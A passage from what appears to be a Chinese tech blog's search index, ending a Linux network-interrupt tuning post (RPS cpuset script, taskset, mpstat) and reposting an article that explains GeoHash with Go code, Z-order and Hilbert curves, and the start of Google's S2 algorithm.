class="keyword">then</span></span><br><span class="line">quotient=2</span><br><span class="line"><span class="keyword">elif</span> [ <span class="variable">$quotient</span> -lt 1 ]; <span class="keyword">then</span></span><br><span class="line">quotient=1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> <span class="variable">$quotient</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">cpuset=<span class="string">&quot;<span class="variable">$&#123;cpuset&#125;</span>f&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> rps_file <span class="keyword">in</span> $(<span class="built_in">ls</span> /sys/class/net/eth*/queues/rx-*/rps_cpus)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cpuset</span> &gt; <span class="variable">$rps_file</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h2 id="四、相关指令"><a href="#四、相关指令" class="headerlink" title="四、相关指令"></a>四、相关指令</h2><h3 id="4-1、观察中断变化"><a href="#4-1、观察中断变化" class="headerlink" title="4.1、观察中断变化"></a>4.1、观察中断变化</h3><p>可以使用<code>watch</code>指令组合<code>/proc/interrupts</code>文件查看中断的变化情况：<code>watch -d -n 1 cat /proc/interrupts</code>，参考信息如下所示：</p><p><img src="https://cdn.bugwz.com/network-queue-proc-interrupts-change.png" alt="/proc/interrupts文件变化"></p><h3 id="4-2、分析CPU的处理耗时"><a href="#4-2、分析CPU的处理耗时" class="headerlink" title="4.2、分析CPU的处理耗时"></a>4.2、分析CPU的处理耗时</h3><p>使用<code>mpstat -P ALL 1</code>分析CPU在处理各种类型上所花费的时间比例，可用于分析CPU是否忙于处理中断（对应项为：<code>%irq</code>），参考如下图所示；</p><p><img src="https://cdn.bugwz.com/network-queue-mpstat.png" alt="mpstat展示"></p><h3 id="4-3、分析CPU的各类利用率"><a href="#4-3、分析CPU的各类利用率" class="headerlink" title="4.3、分析CPU的各类利用率"></a>4.3、分析CPU的各类利用率</h3><p>使用<code>top</code>指令后，按<code>1</code>显示各个CPU的各项利用率分布详情，参考如下图所示：</p><p><img src="https://cdn.bugwz.com/network-queue-top.png" alt="top展示"></p><h3 id="4-4、设置进程的CPU亲和性"><a href="#4-4、设置进程的CPU亲和性" class="headerlink" title="4.4、设置进程的CPU亲和性"></a>4.4、设置进程的CPU亲和性</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看进程的CPU亲和性</span></span><br><span class="line">[root@bugwz ~]<span class="comment"># taskset -p 13716</span></span><br><span class="line">pid 13716<span class="string">&#x27;s current affinity mask: ffffffff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 设置进程的CPU亲和性</span></span><br><span class="line"><span class="string">[root@bugwz ~]# taskset -p 1 13716</span></span><br><span class="line"><span class="string">pid 13716&#x27;</span>s current affinity mask: ffffffff</span><br><span class="line">pid 13716<span class="string">&#x27;s new affinity mask: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 将一个进程绑定到多个CPU上</span></span><br><span class="line"><span class="string">[root@bugwz ~]# taskset -p -c 1,3 13716</span></span><br><span class="line"><span class="string">pid 13716&#x27;</span>s current affinity list: 0</span><br><span class="line">pid 13716<span class="string">&#x27;s new affinity list: 1,3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[root@bugwz ~]# taskset -p -c 1-7 13716</span></span><br><span class="line"><span class="string">pid 13716&#x27;</span>s current affinity list: 1,3</span><br><span class="line">pid 13716<span class="string">&#x27;s new affinity list: 1-7</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Network </tag>
            
            <tag> Interrupt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转-高效的多维空间点索引算法 GeoHash和GoogleS2</title>
      <link href="/2019/11/27/geohash-s2/"/>
      <url>/2019/11/27/geohash-s2/</url>
      
        <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>每天我们晚上加班回家，可能都会用到滴滴或者共享单车。打开 app 会看到如下的界面：</p><p><img src="https://cdn.bugwz.com/geohash-s2-1.png" alt="App Photo"></p><p>app 界面上会显示出自己附近一个范围内可用的出租车或者共享单车。假设地图上会显示以自己为圆心，5公里为半径，这个范围内的车。如何实现呢？最直观的想法就是去数据库里面查表，计算并查询车距离用户小于等于5公里的，筛选出来，把数据返回给客户端。</p><p>这种做法比较笨，一般也不会这么做。为什么呢？因为这种做法需要对整个表里面的每一项都计算一次相对距离。太耗时了。既然数据量太大，我们就需要分而治之。那么就会想到把地图分块。这样即使每一块里面的每条数据都计算一次相对距离，也比之前全表都计算一次要快很多。</p><p>我们也都知道，现在用的比较多的数据库 MySQL、PostgreSQL 都原生支持 B+ 树。这种数据结构能高效的查询。地图分块的过程其实就是一种添加索引的过程，如果能想到一个办法，把地图上的点添加一个合适的索引，并且能够排序，那么就可以利用类似二分查找的方法进行快速查询。</p><p>问题就来了，地图上的点是二维的，有经度和纬度，这如何索引呢？如果只针对其中的一个维度，经度或者纬度进行搜索，那搜出来一遍以后还要进行二次搜索。那要是更高维度呢？三维。可能有人会说可以设置维度的优先级，比如拼接一个联合键，那在三维空间中，x，y，z 谁的优先级高呢？设置优先级好像并不是很合理。</p><p>本篇文章就来介绍2种比较通用的空间点索引算法。</p><h2 id="一、-GeoHash-算法"><a href="#一、-GeoHash-算法" class="headerlink" title="一、 GeoHash 算法"></a>一、 GeoHash 算法</h2><h3 id="1-1、-Geohash-算法简介"><a href="#1-1、-Geohash-算法简介" class="headerlink" title="1.1、 Geohash 算法简介"></a>1.1、 Geohash 算法简介</h3><p>Geohash 是一种地理编码，由 <a href="https://en.wikipedia.org/w/index.php?title=Gustavo_Niemeyer&action=edit&redlink=1">Gustavo Niemeyer</a> 发明的。它是一种分级的数据结构，把空间划分为网格。Geohash 属于空间填充曲线中的 Z 阶曲线（<a href="https://en.wikipedia.org/wiki/Z-order_curve">Z-order curve</a>）的实际应用何为 Z 阶曲线？</p><p><img src="https://cdn.bugwz.com/geohash-s2-2.png" alt="二维的Z阶曲线"></p><p>上图就是 Z 阶曲线。这个曲线比较简单，生成它也比较容易，只需要把每个 Z 首尾相连即可。</p><p><img src="https://cdn.bugwz.com/geohash-s2-3.png" alt="三维的Z阶曲线"></p><p>Z 阶曲线同样可以扩展到三维空间。只要 Z 形状足够小并且足够密，也能填满整个三维空间。</p><p>说到这里可能读者依旧一头雾水，不知道 Geohash 和 Z 曲线究竟有啥关系？其实 Geohash算法 的理论基础就是基于 Z 曲线的生成原理。继续说回 Geohash。</p><p>Geohash 能够提供任意精度的分段级别。一般分级从 1-12 级。</p><p><img src="https://cdn.bugwz.com/geohash-s2-4.png" alt="Geohash精度级别"></p><p>还记得引语里面提到的问题么？这里我们就可以用 Geohash 来解决这个问题。</p><p>我们可以利用 Geohash 的字符串长短来决定要划分区域的大小。这个对应关系可以参考上面表格里面 cell 的宽和高。一旦选定 cell 的宽和高，那么 Geohash 字符串的长度就确定下来了。这样我们就把地图分成了一个个的矩形区域了。</p><p>地图上虽然把区域划分好了，但是还有一个问题没有解决，那就是如何快速的查找一个点附近邻近的点和区域呢？</p><p>Geohash 有一个和 Z 阶曲线相关的性质，那就是一个点附近的地方(但不绝对) hash 字符串总是有公共前缀，并且公共前缀的长度越长，这两个点距离越近。</p><p>由于这个特性，Geohash 就常常被用来作为唯一标识符。用在数据库里面可用 Geohash 来表示一个点。Geohash 这个公共前缀的特性就可以用来快速的进行邻近点的搜索。越接近的点通常和目标点的 Geohash 字符串公共前缀越长（但是这不一定，也有特殊情况，下面举例会说明）</p><p>Geohash 也有几种编码形式，常见的有2种，<a href="%5Bhttps://bugwz.com/2019/11/18/baseX/#%E4%BA%8C-base32%5D(https://bugwz.com/2019/11/18/baseX/#%E4%BA%8C-base32)">Base 32</a> 和 <a href="%5Bhttps://bugwz.com/2019/11/18/baseX/#%E5%85%AB-base-x-2-36%5D(https://bugwz.com/2019/11/18/baseX/#%E5%85%AB-base-x-2-36)">Base 36</a>。</p><h3 id="1-2、-Geohash-实际应用举例"><a href="#1-2、-Geohash-实际应用举例" class="headerlink" title="1.2、 Geohash 实际应用举例"></a>1.2、 Geohash 实际应用举例</h3><p>接下来的举例以 base-32 为例。举个例子。</p><p><img src="https://cdn.bugwz.com/geohash-s2-5.png" alt="演示地图"></p><p>上图是一个地图，地图中间有一个美罗城，假设需要查询距离美罗城最近的餐馆，该如何查询？</p><p>第一步我们需要把地图网格化，利用 geohash。通过查表，我们选取字符串长度为6的矩形来网格化这张地图。</p><p>经过查询，美罗城的经纬度是[31.1932993, 121.43960190000007]。</p><p>先处理纬度。地球的纬度区间是[-90,90]。把这个区间分为2部分，即[-90,0)，[0,90]。31.1932993位于(0,90]区间，即右区间，标记为1。然后继续把(0,90]区间二分，分为[0,45)，[45,90]，31.1932993位于[0,45)区间，即左区间，标记为0。一直划分下去。</p><p><img src="https://cdn.bugwz.com/geohash-s2-6.png" alt="纬度拆分细节图"></p><p>再处理经度，一样的处理方式。地球经度区间是[-180,180]</p><p><img src="https://cdn.bugwz.com/geohash-s2-7.png" alt="精度拆分细节图"></p><p>纬度产生的二进制是101011000101110，经度产生的二进制是110101100101101，按照<strong>“偶数位放经度，奇数位放纬度”</strong>的规则，重新组合经度和纬度的二进制串，生成新的：111001100111100000110011110110，最后一步就是把这个最终的字符串转换成字符，对应需要查找 base-32 的表。11100 11001 11100 00011 00111 10110转换成十进制是 28 25 28 3 7 22，查表编码得到最终结果，wtw37q。</p><p>我们还可以把这个网格周围8个各自都计算出来。</p><p><img src="https://cdn.bugwz.com/geohash-s2-8.png" alt="精度为6的网格表示"></p><p>从地图上可以看出，这邻近的9个格子，前缀都完全一致。都是wtw37。</p><p>如果我们把字符串再增加一位，会有什么样的结果呢？Geohash 增加到7位。</p><p><img src="https://cdn.bugwz.com/geohash-s2-9.png" alt="精度为7的网格表示"></p><p>当Geohash 增加到7位的时候，网格更小了，美罗城的 Geohash 变成了 wtw37qt。</p><p>看到这里，读者应该已经清楚了 Geohash 的算法原理了。咱们把6位和7位都组合到一张图上面来看。</p><p><img src="https://cdn.bugwz.com/geohash-s2-10.png" alt="精度为6/7的网格组合表示"></p><p>可以看到中间大格子的 Geohash 的值是 wtw37q，那么它里面的所有小格子前缀都是 wtw37q。可以想象，当 Geohash 字符串长度为5的时候，Geohash 肯定就为 wtw37 了。</p><p>接下来解释之前说的 Geohash 和 Z 阶曲线的关系。回顾最后一步合并经纬度字符串的规则，<strong>“偶数位放经度，奇数位放纬度”</strong>。读者一定有点好奇，这个规则哪里来的？凭空瞎想的？其实并不是，这个规则就是 Z 阶曲线。看下图：</p><p><img src="https://cdn.bugwz.com/geohash-s2-11.png" alt="Z阶曲线"></p><p>x 轴就是纬度，y轴就是经度。经度放偶数位，纬度放奇数位就是这样而来的。</p><p>最后有一个精度的问题，下面的表格数据一部分来自 Wikipedia。</p><p><img src="https://cdn.bugwz.com/geohash-s2-12.png" alt="Z阶曲线的精度问题"></p><h3 id="1-3、-Geohash-具体实现"><a href="#1-3、-Geohash-具体实现" class="headerlink" title="1.3、 Geohash 具体实现"></a>1.3、 Geohash 具体实现</h3><p>到此，读者应该对 Geohash 的算法都很明了了。接下来用 Go 实现一下 Geohash 算法。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> geohash</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">BASE32                = <span class="string">&quot;0123456789bcdefghjkmnpqrstuvwxyz&quot;</span></span><br><span class="line">MAX_LATITUDE  <span class="type">float64</span> = <span class="number">90</span></span><br><span class="line">MIN_LATITUDE  <span class="type">float64</span> = <span class="number">-90</span></span><br><span class="line">MAX_LONGITUDE <span class="type">float64</span> = <span class="number">180</span></span><br><span class="line">MIN_LONGITUDE <span class="type">float64</span> = <span class="number">-180</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">bits   = []<span class="type">int</span>&#123;<span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>&#125;</span><br><span class="line">base32 = []<span class="type">byte</span>(BASE32)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Box <span class="keyword">struct</span> &#123;</span><br><span class="line">MinLat, MaxLat <span class="type">float64</span> <span class="comment">// 纬度</span></span><br><span class="line">MinLng, MaxLng <span class="type">float64</span> <span class="comment">// 经度</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Box)</span></span> Width() <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> this.MaxLng - this.MinLng</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Box)</span></span> Height() <span class="type">float64</span> &#123;</span><br><span class="line"><span class="keyword">return</span> this.MaxLat - this.MinLat</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入值：纬度，经度，精度(geohash的长度)</span></span><br><span class="line"><span class="comment">// 返回geohash, 以及该点所在的区域</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Encode</span><span class="params">(latitude, longitude <span class="type">float64</span>, precision <span class="type">int</span>)</span></span> (<span class="type">string</span>, *Box) &#123;</span><br><span class="line"><span class="keyword">var</span> geohash bytes.Buffer</span><br><span class="line"><span class="keyword">var</span> minLat, maxLat <span class="type">float64</span> = MIN_LATITUDE, MAX_LATITUDE</span><br><span class="line"><span class="keyword">var</span> minLng, maxLng <span class="type">float64</span> = MIN_LONGITUDE, MAX_LONGITUDE</span><br><span class="line"><span class="keyword">var</span> mid <span class="type">float64</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">bit, ch, length, isEven := <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">true</span></span><br><span class="line"><span class="keyword">for</span> length &lt; precision &#123;</span><br><span class="line"><span class="keyword">if</span> isEven &#123;</span><br><span class="line"><span class="keyword">if</span> mid = (minLng + maxLng) / <span class="number">2</span>; mid &lt; longitude &#123;</span><br><span class="line">ch |= bits[bit]</span><br><span class="line">minLng = mid</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">maxLng = mid</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> mid = (minLat + maxLat) / <span class="number">2</span>; mid &lt; latitude &#123;</span><br><span class="line">ch |= bits[bit]</span><br><span class="line">minLat = mid</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">maxLat = mid</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">isEven = !isEven</span><br><span class="line"><span class="keyword">if</span> bit &lt; <span class="number">4</span> &#123;</span><br><span class="line">bit++</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">geohash.WriteByte(base32[ch])</span><br><span class="line">length, bit, ch = length+<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b := &amp;Box&#123;</span><br><span class="line">MinLat: minLat,</span><br><span class="line">MaxLat: maxLat,</span><br><span class="line">MinLng: minLng,</span><br><span class="line">MaxLng: maxLng,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> geohash.String(), b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-4、-Geohash-的优缺点"><a href="#1-4、-Geohash-的优缺点" class="headerlink" title="1.4、 Geohash 的优缺点"></a>1.4、 Geohash 的优缺点</h3><p>Geohash 的优点很明显，它利用 Z 阶曲线进行编码。而 Z 阶曲线可以将二维或者多维空间里的所有点都转换成一维曲线。在数学上成为分形维。并且 Z 阶曲线还具有局部保序性。</p><p>Z 阶曲线通过交织点的坐标值的二进制表示来简单地计算多维度中的点的z值。一旦将数据被加到该排序中，任何一维数据结构，例如二叉搜索树，B树，跳跃表或（具有低有效位被截断）哈希表 都可以用来处理数据。通过 Z 阶曲线所得到的顺序可以等同地被描述为从四叉树的深度优先遍历得到的顺序。</p><p>这也是 Geohash 的另外一个优点，搜索查找邻近点比较快。</p><p>Geohash 的缺点之一也来自 Z 阶曲线。</p><p>Z 阶曲线有一个比较严重的问题，虽然有局部保序性，但是它也有突变性。在每个 Z 字母的拐角，都有可能出现顺序的突变。</p><p><img src="https://cdn.bugwz.com/geohash-s2-13.png" alt="Z阶曲线的拐角问题展示"></p><p>看上图中标注出来的蓝色的点点。每两个点虽然是相邻的，但是距离相隔很远。看右下角的图，两个数值邻近红色的点两者距离几乎达到了整个正方形的边长。两个数值邻近绿色的点也达到了正方形的一半的长度。</p><p>Geohash 的另外一个缺点是，如果选择不好合适的网格大小，判断邻近点可能会比较麻烦。</p><p><img src="https://cdn.bugwz.com/geohash-s2-14.png" alt="Geohash的临近点判断问题"></p><p>看上图，如果选择 Geohash 字符串为6的话，就是蓝色的大格子。红星是美罗城，紫色的圆点是搜索出来的目标点。如果用 Geohash 算法查询的话，距离比较近的可能是 wtw37p，wtw37r，wtw37w，wtw37m。但是其实距离最近的点就在 wtw37q。如果选择这么大的网格，就需要再查找周围的8个格子。</p><p>如果选择 Geohash 字符串为7的话，那变成黄色的小格子。这样距离红星星最近的点就只有一个了。就是 wtw37qw。</p><p>如果网格大小，精度选择的不好，那么查询最近点还需要再次查询周围8个点。</p><h2 id="二、-空间填充曲线-和-分形"><a href="#二、-空间填充曲线-和-分形" class="headerlink" title="二、 空间填充曲线 和 分形"></a>二、 空间填充曲线 和 分形</h2><p>在介绍第二种多维空间点索引算法之前，要先谈谈空间填充曲线(Space-filling curve)和分形。</p><p>解决多维空间点索引需要解决2个问题，第一，如何把多维降为低维或者一维？第二，一维的曲线如何分形？</p><h3 id="2-1、-空间填充曲线"><a href="#2-1、-空间填充曲线" class="headerlink" title="2.1、 空间填充曲线"></a>2.1、 空间填充曲线</h3><p>在数学分析中，有这样一个难题：能否用一条无限长的线，穿过任意维度空间里面的所有点？</p><p><img src="https://cdn.bugwz.com/geohash-s2-15.png" alt="空间填充曲线"></p><p>在1890年，Giuseppe Peano 发现了一条连续曲线，现在称为 Peano 曲线，它可以穿过单位正方形上的每个点。他的目的是构建一个可以从单位区间到单位正方形的连续映射。 Peano 受到 Georg Cantor 早期违反直觉的研究结果的启发，即单位区间中无限数量的点与任何有限维度流型（<a href="https://en.wikipedia.org/wiki/Manifold">manifold</a>）中无限数量的点，基数相同。 Peano 解决的问题实质就是，是否存在这样一个连续的映射，一条能填充满平面的曲线。上图就是他找到的一条曲线。</p><p>一般来说，一维的东西是不可能填满2维的方格的。但是皮亚诺曲线恰恰给出了反例。皮亚诺曲线是一条连续的但处处不可导的曲线。</p><p>皮亚诺曲线的构造方法如下：取一个正方形并且把它分出九个相等的小正方形，然后从左下角的正方形开始至右上角的正方形结束，依次把小正方形的中心用线段连接起来；下一步把每个小正方形分成九个相等的正方形，然后上述方式把其中中心连接起来……将这种操作手续无限进行下去，最终得到的极限情况的曲线就被称作皮亚诺曲线。</p><p>皮亚诺对区间[0，1]上的点和正方形上的点的映射作了详细的数学描述。实际上，正方形的这些点对于<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/31a5c18739ff04858eecc8fec2f53912c348e0e5" alt="img">，可找到两个连续函数 x &#x3D; f(t) 和 y &#x3D; g(t)，使得 x 和 y 取属于单位正方形的每一个值。</p><p>一年后，即1891年，<a href="https://zh.wikipedia.org/wiki/%E5%B8%8C%E5%B0%94%E4%BC%AF%E7%89%B9">希尔伯特</a>就作出了这条曲线，叫希尔伯特曲线（Hilbert curve）。</p><p><img src="https://cdn.bugwz.com/geohash-s2-16.png" alt="1-6阶的希尔伯特曲线"></p><p><img src="https://cdn.bugwz.com/geohash-s2-17.png" alt="三维空间的希尔伯特曲线"></p><p>之后还有很多变种的空间填充曲线，龙曲线(Dragon curve)、 高斯帕曲线(Gosper curve)、Koch曲线(Koch curve)、摩尔定律曲线(Moore curve)、谢尔宾斯基曲线(Sierpiński curve)、奥斯古德曲线(Osgood curve)。这些曲线和本文无关，就不详细介绍了。</p><p><img src="https://cdn.bugwz.com/geohash-s2-18.png" alt="龙曲线"></p><p><img src="https://cdn.bugwz.com/geohash-s2-19.png" alt="高斯帕曲线"></p><p><img src="https://cdn.bugwz.com/geohash-s2-20.png" alt="Koch曲线"></p><p><img src="https://cdn.bugwz.com/geohash-s2-21.png" alt="im"></p><p><img src="https://cdn.bugwz.com/geohash-s2-22.png" alt="im"></p><p>在数学分析中，空间填充曲线是一个参数化的注入函数，它将单位区间映射到单位正方形，立方体，更广义的，n维超立方体等中的连续曲线，随着参数的增加，它可以任意接近单位立方体中的给定点。除了数学重要性之外，空间填充曲线也可用于降维，数学规划，稀疏多维数据库索引，电子学和生物学。空间填充曲线的现在被用在互联网地图中。</p><h3 id="2-2、-分形"><a href="#2-2、-分形" class="headerlink" title="2.2、 分形"></a>2.2、 分形</h3><p>皮亚诺曲线的出现，说明了人们对维数的认识是有缺陷的，有必要重新考察维数的定义。这就是<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E5%BD%A2%E5%87%A0%E4%BD%95">分形几何</a>考虑的问题。在分形几何中，维数可以是分数叫做分维。</p><p>多维空间降维以后，如何分形，也是一个问题。分形的方式有很多种，这里有一个<a href="https://en.wikipedia.org/wiki/List_of_fractals_by_Hausdorff_dimension">列表</a>，可以查看如何分形，以及每个分形的分形维数，即豪斯多夫分形维(Hausdorff fractals dimension)和拓扑维数。这里就不细说分形的问题了，感兴趣的可以仔细阅读链接里面的内容。</p><p>接下来继续来说多维空间点索引算法，下面一个算法的理论基础来自希尔伯特曲线，先来仔细说说希尔伯特曲线。</p><h2 id="三、-Hilbert-Curve-希尔伯特曲线"><a href="#三、-Hilbert-Curve-希尔伯特曲线" class="headerlink" title="三、 Hilbert Curve 希尔伯特曲线"></a>三、 Hilbert Curve 希尔伯特曲线</h2><h3 id="3-1、-希尔伯特曲线的定义"><a href="#3-1、-希尔伯特曲线的定义" class="headerlink" title="3.1、 希尔伯特曲线的定义"></a>3.1、 希尔伯特曲线的定义</h3><p><img src="https://cdn.bugwz.com/geohash-s2-23.png" alt="希尔伯特曲线"></p><p><strong>希尔伯特曲线</strong>一种能填充满一个平面正方形的分形曲线（<a href="https://zh.wikipedia.org/w/index.php?title=%E7%A9%BA%E9%96%93%E5%A1%AB%E5%85%85%E6%9B%B2%E7%B7%9A&action=edit&redlink=1">空间填充曲线</a>），由<a href="https://zh.wikipedia.org/wiki/%E5%A4%A7%E8%A1%9B%C2%B7%E5%B8%8C%E7%88%BE%E4%BC%AF%E7%89%B9">大卫·希尔伯特</a>在1891年提出。</p><p>由于它能填满平面，它的<a href="https://zh.wikipedia.org/wiki/%E8%B1%AA%E6%96%AF%E5%A4%9A%E5%A4%AB%E7%B6%AD">豪斯多夫维</a>是2。取它填充的正方形的边长为1，第n步的希尔伯特曲线的长度是2^n - 2^(-n)。</p><h3 id="3-2、-希尔伯特曲线的构造方法"><a href="#3-2、-希尔伯特曲线的构造方法" class="headerlink" title="3.2、 希尔伯特曲线的构造方法"></a>3.2、 希尔伯特曲线的构造方法</h3><p>一阶的希尔伯特曲线，生成方法就是把正方形四等分，从其中一个子正方形的中心开始，依次穿线，穿过其余3个正方形的中心。</p><p><img src="https://cdn.bugwz.com/geohash-s2-24.png" alt="希尔伯特曲线的构造方法"></p><p>二阶的希尔伯特曲线，生成方法就是把之前每个子正方形继续四等分，每4个小的正方形先生成一阶希尔伯特曲线。然后把4个一阶的希尔伯特曲线首尾相连。</p><p><img src="https://cdn.bugwz.com/geohash-s2-25.png" alt="希尔伯特曲线的构造方法"></p><p>三阶的希尔伯特曲线，生成方法就是与二阶类似，先生成二阶希尔伯特曲线。然后把4个二阶的希尔伯特曲线首尾相连。</p><p><img src="https://cdn.bugwz.com/geohash-s2-26.png" alt="希尔伯特曲线的构造方法"></p><p>n阶的希尔伯特曲线的生成方法也是递归的，先生成n-1阶的希尔伯特曲线，然后把4个n-1阶的希尔伯特曲线首尾相连。</p><p><img src="https://cdn.bugwz.com/geohash-s2-27.png" alt="希尔伯特曲线的构造方法"></p><h3 id="3-3、-为何要选希尔伯特曲线"><a href="#3-3、-为何要选希尔伯特曲线" class="headerlink" title="3.3、 为何要选希尔伯特曲线"></a>3.3、 为何要选希尔伯特曲线</h3><p>看到这里可能就有读者有疑问了，这么多空间填充曲线，为何要选希尔伯特曲线？</p><p>因为希尔伯特曲线有非常好的特性。</p><h4 id="3-3-1、降维"><a href="#3-3-1、降维" class="headerlink" title="3.3.1、降维"></a>3.3.1、降维</h4><p>首先，作为空间填充曲线，希尔伯特曲线可以对多维空间有效的降维。</p><p><img src="https://cdn.bugwz.com/geohash-s2-28.png" alt="希尔伯特曲线将平面上的点展开成一维的线"></p><p>上图就是希尔伯特曲线在填满一个平面以后，把平面上的点都展开成一维的线了。</p><p>可能有人会有疑问，上图里面的希尔伯特曲线只穿了16个点，怎么能代表一个平面呢？</p><p><img src="https://cdn.bugwz.com/geohash-s2-29.png" alt="n阶希尔伯特曲线"></p><p>当然，当n趋近于无穷大的时候，n阶希尔伯特曲线就可以近似填满整个平面了。</p><h4 id="稳定"><a href="#稳定" class="headerlink" title="稳定"></a>稳定</h4><p>当n阶希尔伯特曲线，n趋于无穷大的时候，曲线上的点的位置基本上趋于稳定。举个例子：</p><p><img src="https://cdn.bugwz.com/geohash-s2-30.png" alt="希尔伯特曲线与蛇形曲线对比"></p><p>上图左边是希尔伯特曲线，右边是蛇形的曲线。当n趋于无穷大的时候，两者理论上都可以填满平面。但是为何希尔伯特曲线更加优秀呢？</p><p>在蛇形曲线上给定一个点，当n趋于无穷大的过程中，这个点在蛇形曲线上的位置是时刻变化的。</p><p><img src="https://cdn.bugwz.com/geohash-s2-31.png" alt="蛇形曲线中位置点的变化性"></p><p>这就造成了点的相对位置始终不定。</p><p>再看看希尔伯特曲线，同样是一个点，在n趋于无穷大的情况下：</p><p><img src="https://cdn.bugwz.com/geohash-s2-32.png" alt="希尔伯特曲线中位置点的不变性"></p><p>从上图可以看到，点的位置几乎没有怎么变化。所以希尔伯特曲线更加优秀。</p><h4 id="3-3-3、-连续"><a href="#3-3-3、-连续" class="headerlink" title="3.3.3、 连续"></a>3.3.3、 连续</h4><p><img src="https://cdn.bugwz.com/geohash-s2-33.png" alt="im"></p><p><img src="https://cdn.bugwz.com/geohash-s2-34.png" alt="im"></p><p>希尔伯特曲线是连续的，所以能保证一定可以填满空间。连续性是需要数学证明的。具体证明方法这里就不细说了，感兴趣的可以点文章末尾一篇关于希尔伯特曲线的论文，那里有连续性的证明。</p><p>接下来要介绍的谷歌的 S2 算法就是基于希尔伯特曲线的。现在读者应该明白选择希尔伯特曲线的原因了吧。</p><h2 id="四、-S2-算法"><a href="#四、-S2-算法" class="headerlink" title="四、 S2 算法"></a>四、 <a href="https://godoc.org/github.com/golang/geo/s2">S2</a> 算法</h2><blockquote><p><a href="https://code.google.com/p/s2-geometry-library/">Google’s S2 library</a> is a real treasure, not only due to its capabilities for spatial indexing but also because it is a library that was released more than 4 years ago and it didn’t get the attention it deserved</p></blockquote><p>上面这段话来自2015年一位谷歌工程师的博文。他由衷的感叹 S2 算法发布4年没有得到它应有的赞赏。不过现在 S2 已经被各大公司使用了。</p><p>在介绍这个重量级算法之前，先解释一些这个算法的名字由来。S2其实是来自几何数学中的一个数学符号 S²，它表示的是单位球。S2 这个库其实是被设计用来解决球面上各种几何问题的。值得提的一点是，除去 golang 官方 repo 里面的 geo&#x2F;s2 完成度目前只有40%，其他语言，Java，C++，Python 的 S2 实现都完成100%了。本篇文章讲解以 Go 的这个版本为主。</p><p>接下来就看看怎么用 S2 来解决多维空间点索引的问题的。</p><h3 id="4-1、-球面坐标转换"><a href="#4-1、-球面坐标转换" class="headerlink" title="4.1、 球面坐标转换"></a>4.1、 球面坐标转换</h3><p>按照之前我们处理多维空间的思路，先考虑如何降维，再考虑如何分形。</p><p>众所周知，地球是近似一个球体。球体是一个三维的，如何把三维降成一维呢？</p><p>球面上的一个点，在直角坐标系中，可以这样表示：</p><p><img src="https://cdn.bugwz.com/geohash-s2-35.png" alt="球面一点在直角坐标系中的表示"></p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">x</span> = r * <span class="built_in">sin</span> θ * <span class="built_in">cos</span> φ</span><br><span class="line"><span class="keyword">y</span> = r * <span class="built_in">sin</span> θ * <span class="built_in">sin</span> φ </span><br><span class="line"><span class="keyword">z</span> = r * <span class="built_in">cos</span> θ</span><br></pre></td></tr></table></figure><p>通常地球上的点我们会用经纬度来表示。</p><p><img src="https://cdn.bugwz.com/geohash-s2-36.png" alt="地球上的点使用经纬度表示"></p><p>再进一步，我们可以和球面上的经纬度联系起来。不过这里需要注意的是，纬度的角度 α 和直角坐标系下的球面坐标 θ 加起来等于 90°。所以三角函数要注意转换。</p><p>于是地球上任意的一个经纬度的点，就可以转换成 f(x,y,z)。</p><p>在 S2 中，地球半径被当成单位 1 了。所以半径不用考虑。x，y，z的值域都被限定在了[-1,1] x [-1,1] x [-1,1]这个区间之内了。</p><h3 id="4-2、-球面变平面"><a 